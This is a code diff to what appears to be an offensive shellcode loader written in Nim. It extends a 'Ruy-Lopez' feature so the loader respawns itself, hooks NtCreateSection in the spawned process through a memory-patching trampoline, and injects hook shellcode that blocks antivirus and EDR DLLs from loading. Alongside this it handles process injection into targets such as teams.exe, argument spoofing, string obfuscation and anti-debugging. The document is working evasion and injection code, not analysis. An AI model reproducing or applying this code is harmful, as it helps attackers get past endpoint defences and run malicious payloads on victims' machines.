@@ -164,6 +164,7 @@ Options:
   --jmpEntry    This option will enable a custom Shellcode Entrypoint from a DLL backed function to avoid unbacked memory as Thread/APC start address. The target function will be hooked with a JMP to the Shellcode
     --jmpEntryDLL value    Specify a DLL to use for the custom Shellcode Entrypoint
     --jmpEntryFunc value    Specify a function to use for the custom Shellcode Entrypoint
+  --ruy-lopez    Use Ruy-Lopez to prevent AV/EDR DLLs from being loaded into the local or newly spawned process. (Doesnt work for injection into existing processes)
 
 [Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]
 
@@ -183,7 +184,6 @@ Options:
   --mapSection    Map the shellcode into via NtCreateSection/NtMapViewOfSection . For remote injection decryption will happen AFTER writing the Shellcode into the remote process
   --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
       --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
-          --ruy-lopez    Use Ruy-Lopez to prevent AV/EDR DLLs from being loadied into the newly spawned process.
       --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
                          Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
       --spoofArgs ArgstoSpoof    Spoof the arguments of the process to inject into
@@ -256,6 +256,7 @@ var
     customspawnprocess: string = "RuntimeBroker.exe"
     parentProcess: string = ""
     spoofArgs: string = ""
+    randomArgs: int = rand(1 .. 100)
     shellcodeFile: seq[string] = @["enc.blob"]
     keyFile: seq[string] = @["key.txt"]
     kfile: string = ""
@@ -838,9 +839,9 @@ if(service):
     # For some reason, started services have the being debugged flag set or this check breaks the service, so we disable it
     antidebug = false
 
-if ((remoteinject == false) and ruylopez):
-    echo "Error: Ruy-Lopez can currently only be used in combination with --remoteinject"
-    quit(1)
+#if ((remoteinject == false) and ruylopez):
+#    echo "Error: Ruy-Lopez can currently only be used in combination with --remoteinject"
+#    quit(1)
 
 # JmpEntry and Threadless cannot be used in combination, as JmpEntry creates a thread and Threadless has the goal of avoiding thread creation
 if (jmpEntry and threadless):
@@ -880,7 +881,7 @@ if (peload and shellcode):
     quit(1)
 
 # DripAllocate, CallbackExecute, localCreateThread, QueueApc, MapSection, Caro-Kann are shellcode specific. They cannot be used in combination with csharp, interactivePS or peload
-if((csharp or interactivePS) and (dripallocate or callbackexecute or localCreateThread or useQueueAPC or remoteMapSection or carokann or ruylopez)):
+if((csharp or interactivePS) and (dripallocate or callbackexecute or localCreateThread or useQueueAPC or remoteMapSection or carokann)):
     echo "Error: Cannot use --csharp/--interactivePS with --dripallocate/--CallbackExecute/--localCreateThread/--QueueApc/--mapSection/--Caro-Kann!"
     echo "This is Shellcode specific options."
     quit(1)
@@ -1513,6 +1514,7 @@ let LoadAssemblyStub = fmt"""
     var cmd: seq[string]
     var i = 1
     discard calcHard()
+
     when defined(args):
         cmd.add({arguments.split(" ")})
     while i <= paramCount():
@@ -1524,6 +1526,15 @@ let LoadAssemblyStub = fmt"""
         else:
             cmd.add(paramStr(i))
         inc(i)
+    when defined(ruylopez):
+        when defined(localinject):
+            if(amISpawned()):
+                # for lib_only remove the 2nd argument from cmd, as this is the random integer fake param
+                when defined(lib_only):
+                    cmd = cmd[0 .. 1] & cmd[3 .. cmd.len - 1]
+                else:
+                    # remove the 1st parameter
+                    cmd = cmd[1 .. cmd.len - 1]
 """
 
 let LoadAssemblyStubArgs = """
@@ -1918,8 +1929,26 @@ import strutils
 import ptr_math
 when defined(ruylopez):
     import dynlib
-    import Hook
-    import RuyGetSyscallStub
+    type
+        typeNtCreateSection* = proc (SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+                        FileHandle: HANDLE): NTSTATUS {.stdcall.}
+
+    type
+        MyNtFlushInstructionCache* = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, NumberofBytestoFlush: ULONG): NTSTATUS {.stdcall.}
+
+
+    type
+        HookedNtCreate* {.bycopy.} = object
+            origNtCreate*: typeNtCreateSection
+            ntCreateStub*: array[24, BYTE]
+
+        HookTrampolineBuffers* {.bycopy.} = object
+            originalBytes*: HANDLE    ##  (Input) Buffer containing bytes that should be restored while unhooking.
+            originalBytesSize*: DWORD  ##  (Output) Buffer that will receive bytes present prior to trampoline installation/restoring.
+            previousBytes*: HANDLE
+            previousBytesSize*: DWORD
+
 # something seams to be still missing here
 #from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
 #from winim/lean import FARPROC,NtClose,VirtualAllocEx,NT_SUCCESS
@@ -1973,6 +2002,13 @@ when defined(Hellsgate):
     from os import paramStr
     {.passC:"-masm=intel".}
     from winlean import getCurrentProcess
+
+when defined(localinject):
+    when defined(ruylopez):
+        from os import getAppFilename
+        from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
+        from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
+        import dynlib
 
 when defined(remoteinject):
     from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
@@ -2867,6 +2903,125 @@ SleepyCryptLoop(10000)
 
 let NotepadProcIDStub * = fmt"""
 
+    when defined(ruylopez):
+
+        var ntdlldll = LoadLibraryA(obf("ntdll.dll"))
+        if (ntdlldll == 0):
+            echo obf("[X] Failed to load ntdll.dll")
+
+
+        var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,obf("NtFlushInstructionCache"))
+        if isNil(NtFlushInstructionCacheAddress):
+            echo obf("[X] Failed to get the address of 'NtFlushInstructionCache'")
+
+
+        var NtFlushInstructionCache: MyNtFlushInstructionCache
+        NtFlushInstructionCache = cast[MyNtFlushInstructionCache](NtFlushInstructionCacheAddress)
+
+
+        proc fastTrampoline(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers = nil): bool
+
+        var g_hookedNtCreate: HookedNtCreate
+
+        var ntCreate_Address: HANDLE
+
+        var NtCreateSection: typeNtCreateSection
+
+        proc fastTrampoline(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers): bool =
+            var trampoline: seq[byte]
+            if defined(amd64):
+                trampoline = @[
+                    byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
+                    byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
+                ]
+                var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
+                copyMem(&trampoline[2] , &tempjumpaddr, 6)
+            elif defined(i386):
+                trampoline = @[
+                    byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
+                    byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
+                ]
+                var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
+                copyMem(&trampoline[1] , &tempjumpaddr, 3)
+            
+            var dwSize: SIZE_T = cast[SIZE_T](len(trampoline))
+            var dwordSize: DWORD = DWORD(len(trampoline))
+            var dwOldProtect: DWORD = 0
+            var output: bool = false
+            var status: NTSTATUS = 0
+            var szWritten: SIZE_T = 0
+            
+
+
+            if (buffers != nil):
+                if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
+                    return false
+                copyMem(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
+            
+            var protectAddress: LPVOID = addressToHook
+
+            status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_READWRITE,addr dwOldProtect)
+
+            if (status == STATUS_SUCCESS):
+                echo obf("[+] NtProtectVirtualMemory RW permissions set for the hook")
+                status = NtWriteVirtualMemory(targetProc,addressToHook,addr trampoline[0],dwordSize,addr szWritten)
+                if (status == 0):
+                    echo obf("[+] NtWriteVirtualMemory - hook set.")
+                    output = true
+                else:
+                    echo obf("[-] NtWriteVirtualMemory failed: "), toHex(status)
+                    output = false
+            else:
+                echo obf("[-] NtProtectVirtualMemory for the hook failed: "), toHex(status)
+                output = false
+            
+            protectAddress = addressToHook
+            status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_EXECUTE_READ,addr dwOldProtect)
+            
+            if(status != STATUS_SUCCESS):
+                echo obf("[-] NtProtectVirtualMemory to restore page permissions failed")
+            else:
+                echo obf("[+] NtProtectVirtualMemory succeeded, page permissions (RX) restored")
+            
+            
+            status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwordSize)
+            if (status == 0):
+                echo obf("[+] NtFlushInstructionCache success")
+            else:
+                echo obf("[-] NtFlushInstructionCache failed: "), toHex(status)
+            
+            return output
+
+    when defined(ruylopez):
+        proc checkIfInteger(input: string): bool =
+            try:
+                discard parseInt(input)
+                return true
+            except:
+                return false
+
+
+        proc amISpawned(): bool =
+            when defined(lib_only):
+                if(paramCount() >= 2):
+                    # if paramStr(2) is an integer between 1 and 100
+                    if((paramStr(2) != "") and checkIfInteger(paramStr(2))):
+                        if (parseInt(paramStr(2)) > 0) and (parseInt(paramStr(2)) <= 100):
+                            return true
+                    else:
+                        return false
+            else:
+                # if one or more arguments provided return
+                if (paramCount() >= 1):
+                    if((paramStr(1) != "") and checkIfInteger(paramStr(1))):
+                        # check if integer between 1 and 100
+                        if (parseInt(paramStr(1)) > 0) and (parseInt(paramStr(1)) <= 100):
+                            return true
+                    else:
+                        when defined(verbose):
+                            echo obf("[*] No input parameters, spawning process...")
+                        return false
+            return false
 
     proc FindPidByName (processName : string):DWORD =
         try:
@@ -2889,6 +3044,7 @@ let NotepadProcIDStub * = fmt"""
     
     # We will re-Use this Handle to avoid using NtOpenProcess again later and it's corresponding Kernel Callback
     var tProcess: HANDLE
+    var treadHandle: HANDLE
     
     proc StartProcess(): void =
         var 
@@ -2897,7 +3053,6 @@ let NotepadProcIDStub * = fmt"""
             ps: SECURITY_ATTRIBUTES
             si: STARTUPINFOEX
             status: WINBOOL
-            tHandle: HANDLE
             tProcPath: WideCString
             ts: SECURITY_ATTRIBUTES
         
@@ -2905,11 +3060,43 @@ let NotepadProcIDStub * = fmt"""
         ts.nLength = sizeof(ts).cint
         si.StartupInfo.cb = sizeof(si).cint
 
+        
+        when defined(localinject):
 
-        when defined spoof_args:
-            tProcPath = newWideCString(obf(r"{customspawnprocess}") & " " & obf("{spoofArgs}"))
+            # we will for local execution spawn our own process again and inject the hook into it. SO we need the path for our own (the executing) process, which will be tProcPath
+            #var hModule: HMODULE = GetModuleHandle(nil)
+            #var path: string = newString(1024)
+            #GetModuleFileName(hModule, cast[LPWSTR](addr path[0]), 1024)
+            
+            #let pathString = path[0 .. path.len - 1].cstring()
+            var pathString: string = getAppFilename()
+            when defined(verbose):
+                echo obf("[*] Path to our own process: ") & pathString
+            when defined(logFile):
+                logVerbose(obf("[*] Path to our own process: ") & pathString)
+
+            var comandline: string = ""
+            var i = 1
+            
+            while i <= paramCount():
+                when defined(lib_only):
+                    if (i != 1):
+                        # first parameter is rundll32.exe,Funcname (skip that)
+                        comandline = comandline & " " & paramStr(i)
+                else:
+                    comandline = comandline & " " & paramStr(i)
+                inc(i)          
+
+            when defined spoof_args:
+                tProcPath = newWideCString(pathString & " " & obf("{randomArgs}") & comandline & obf("{spoofArgs}"))
+            else:
+                # add random args, so that it wont spawn itself again
+                tProcPath = newWideCString(pathString & " " & obf("{randomArgs}") & comandline)
         else:
-            tProcPath = newWideCString(obf(r"{customspawnprocess}"))
+            when defined spoof_args:
+                tProcPath = newWideCString(obf(r"{customspawnprocess}") & " " & obf("{spoofArgs}"))
+            else:
+                tProcPath = newWideCString(obf(r"{customspawnprocess}"))
 
         when defined(blockDLLs) or (obf("{parentProcess}") != ""):
             InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
@@ -2990,117 +3177,148 @@ let NotepadProcIDStub * = fmt"""
             r"C:\Windows\system32\",
             addr si.StartupInfo,
             addr pi)
-
+        
         tProcess = pi.hProcess
         remoteProcID = pi.dwProcessId
-        tHandle = pi.hThread
+        treadHandle = pi.hThread
+        
+        when defined(verbose):
+            echo obf("[*] CreateProcess: "), status
+            if (status == 0):
+                echo obf("    \\-- Error: "), GetlastError()
 
-    StartProcess()
+        
+
+    # when defined libonly and more than two argument provided return, we already got spawned again for ruy-lopez and dont want to end up in a loop
+    when defined(localinject):
+        if(not amISpawned()):
+            when defined(verbose):
+                echo obf("[*] Spawning process...")
+            StartProcess()
+        else:
+            when defined(verbose):
+                echo obf("[*] We are already spawned, continue...")
+            
+    else:
+        StartProcess()
 
     when defined(ruylopez):
 
-        var ntdll: LibHandle = loadLib(obf("ntdll"))
+        if (amISpawned() == false):
 
-        var ntCreateSectionHandle: pointer = ntdll.symAddr(obf("NtCreateSection")) # equivalent of GetProcAddress()
-        
-        when defined(verbose):
-            echo obf("[*] Injecting Shellcode for the hook into the remote process: "), remoteProcID
+            var ntdll: LibHandle = loadLib(obf("ntdll"))
 
-        const hookShellcode = slurp"ruylopez.bin"
-
-        var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
-
-        # Allocate memory in which the Shellcode will be written later on after restoring the original NtCreateSection bytes
-
-        var rPtr: LPVOID
-        var status: NTSTATUS
-        var sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)
-
-        status = NtAllocateVirtualMemory(
-            tProcess, &rPtr, 0, &sc_size, 
-            MEM_COMMIT, 
-            PAGE_EXECUTE_READWRITE);
-
-        when defined(verbose):
-            if(status == 0):
-                echo obf("[+] NtAllocateVirtualMemory success!")
-            else:
-                echo obf("[-] NtAllocateVirtualMemory failed!")
-                quit(1)
-
-        when defined(verbose):
-            if(rPtr != nil):
-                echo obf("[+] Successfully allocated remote process memory for the shellcode")
-            else:
-                echo obf("[-] Memory allocation for remote process failed!")
-                quit(1)
-
-        var buffers: HookTrampolineBuffers
-
-        var addressToHook: LPVOID = cast[LPVOID](ntCreateSectionHandle)
-        ntCreate_Address = cast[HANDLE](ntCreateSectionHandle)
-        var output: bool = false
-
-        if (ntCreate_Address == 0):
-            quit(1)
+            var ntCreateSectionHandle: pointer = ntdll.symAddr(obf("NtCreateSection")) # equivalent of GetProcAddress()
             
-        buffers.previousBytes = cast[HANDLE](ntCreate_Address)
-        buffers.previousBytesSize = DWORD(sizeof(ntCreate_Address))
-        g_hookedNtCreate.origNtCreate = cast[typeNtCreateSection](addressToHook)
-        var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
-        copyMem(PointerToOrigBytes, addressToHook, 24)
-        
-        when defined(verbose):
-            echo obf("[*] Writing allocated Shellcode address "), repr(rPtr), obf(" into Original NtCreateSection address as hook: ")
+            when defined(verbose):
+                echo obf("[*] Injecting Shellcode for the hook into the remote process: "), remoteProcID
 
-        output = fastTrampoline(tProcess, cast[LPVOID](addressToHook), rPtr, &buffers)
+            const hookShellcode = slurp"ruylopez.bin"
 
-        when defined(verbose):
-            if(output):
-                echo obf("[+] Remotely Hooked NtCreateSection: "), output
-            else:
-                echo obf("[-] Remote Hook failed!")
+            var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
+
+            # Allocate memory in which the Shellcode will be written later on after restoring the original NtCreateSection bytes
+
+            var rPtr: LPVOID
+            var status: NTSTATUS
+            var sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)
+
+            status = NtAllocateVirtualMemory(
+                tProcess, &rPtr, 0, &sc_size, 
+                MEM_COMMIT, 
+                PAGE_EXECUTE_READWRITE);
+
+            when defined(verbose):
+                if(status == 0):
+                    echo obf("[+] NtAllocateVirtualMemory success!")
+                else:
+                    echo obf("[-] NtAllocateVirtualMemory failed!")
+                    quit(1)
+
+            when defined(verbose):
+                if(rPtr != nil):
+                    echo obf("[+] Successfully allocated remote process memory for the shellcode")
+                else:
+                    echo obf("[-] Memory allocation for remote process failed!")
+                    quit(1)
+
+            var buffers: HookTrampolineBuffers
+
+            var addressToHook: LPVOID = cast[LPVOID](ntCreateSectionHandle)
+            ntCreate_Address = cast[HANDLE](ntCreateSectionHandle)
+            var output: bool = false
+
+            if (ntCreate_Address == 0):
                 quit(1)
+                
+            buffers.previousBytes = cast[HANDLE](ntCreate_Address)
+            buffers.previousBytesSize = DWORD(sizeof(ntCreate_Address))
+            g_hookedNtCreate.origNtCreate = cast[typeNtCreateSection](addressToHook)
+            var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
+            copyMem(PointerToOrigBytes, addressToHook, 24)
+            
+            when defined(verbose):
+                echo obf("[*] Writing allocated Shellcode address "), repr(rPtr), obf(" into Original NtCreateSection address as hook: ")
+
+            output = fastTrampoline(tProcess, cast[LPVOID](addressToHook), rPtr, &buffers)
+
+            when defined(verbose):
+                if(output):
+                    echo obf("[+] Remotely Hooked NtCreateSection: "), output
+                else:
+                    echo obf("[-] Remote Hook failed!")
+                    quit(1)
 
 
-        # We need to restore the original bytes into our shellcode egg, so that the Shellcode itself can restore the original NtCreateSection later on.
-        # To do that, we need to find the egg in the Shellcode and replace it with the original bytes.
-        when defined(verbose):
-            echo obf("[*] Searching for egg in the shellcode...")
+            # We need to restore the original bytes into our shellcode egg, so that the Shellcode itself can restore the original NtCreateSection later on.
+            # To do that, we need to find the egg in the Shellcode and replace it with the original bytes.
+            when defined(verbose):
+                echo obf("[*] Searching for egg in the shellcode...")
 
-        var eggIndex = 0
-        for i in 0 ..< hookShellcodeBytes.len:
-            if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0xBE) and (hookShellcodeBytes[i+3] == 0xEF) and (hookShellcodeBytes[i+4] == 0x13) and (hookShellcodeBytes[i+5] == 0x37):
+            var eggIndex = 0
+            for i in 0 ..< hookShellcodeBytes.len:
+                if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0xBE) and (hookShellcodeBytes[i+3] == 0xEF) and (hookShellcodeBytes[i+4] == 0x13) and (hookShellcodeBytes[i+5] == 0x37):
+                    when defined(verbose):
+                        echo obf("[+] Found egg at index: "), i
+                    eggIndex = i
+                    break
+
+            # Write the original bytes into the egg
+            when defined(verbose):
+                echo obf("[*] Modifying shellcode to add original NtCreateSection bytes")
+            copyMem(unsafeAddr hookShellcodeBytes[eggIndex], PointerToOrigBytes, 24)
+            when defined(verbose):
+                echo obf("[*] Done.")
+
+            # Finally write the shellcode into the remote process
+            var bytesWritten: SIZE_T
+
+            status = NtWriteVirtualMemory(
+                    tProcess, 
+                    rPtr, 
+                    unsafeAddr hookShellcodeBytes[0], 
+                    sc_size-1, 
+                    addr bytesWritten);
+
+            when defined(verbose):
+                if (status == 0):
+                    echo obf("[+] NtWriteVirtualMemory: "), status
+                    echo obf("    \\-- bytes written: "), bytesWritten
+                    echo ""
+                else:
+                    echo obf("[-] NtWriteVirtualMemory failed!")
+                    quit(1)
+    when defined(ruylopez):
+        when defined(localinject):
+            if(not amISpawned()):
+                # resume main thread for execution
+                ResumeThread(treadHandle)
+                # Wait for the thread to finish
+                WaitForSingleObject(treadHandle, INFINITE)
                 when defined(verbose):
-                    echo obf("[+] Found egg at index: "), i
-                eggIndex = i
-                break
-
-        # Write the original bytes into the egg
-        when defined(verbose):
-            echo obf("[*] Modifying shellcode to add original NtCreateSection bytes")
-        copyMem(unsafeAddr hookShellcodeBytes[eggIndex], PointerToOrigBytes, 24)
-        when defined(verbose):
-            echo obf("[*] Done.")
-
-        # Finally write the shellcode into the remote process
-        var bytesWritten: SIZE_T
-
-        status = NtWriteVirtualMemory(
-                tProcess, 
-                rPtr, 
-                unsafeAddr hookShellcodeBytes[0], 
-                sc_size-1, 
-                addr bytesWritten);
-
-        when defined(verbose):
-            if (status == 0):
-                echo obf("[+] NtWriteVirtualMemory: "), status
-                echo obf("    \\-- bytes written: "), bytesWritten
-                echo ""
-            else:
-                echo obf("[-] NtWriteVirtualMemory failed!")
+                    echo obf("[*] Quit main process...")
                 quit(1)
+
 
     when defined(verbose):
         echo obf("[*] Sleeping in between for: "), {sleepinbetween}
@@ -3386,8 +3604,13 @@ stub.add(MainStub)
 
 stub.add(getRandStub())
 
+
 if(getfreshstub):
     stub.add(RetrieveSyscallStubs)
+
+# if ruy-lopez and localinject or csharp/peload add NotepadProcIDStub
+if(ruylopez and (localinject or csharp or peload)):
+    stub.add(NotepadProcIDStub)
 
 if(unhook):
     if(hellsgate):
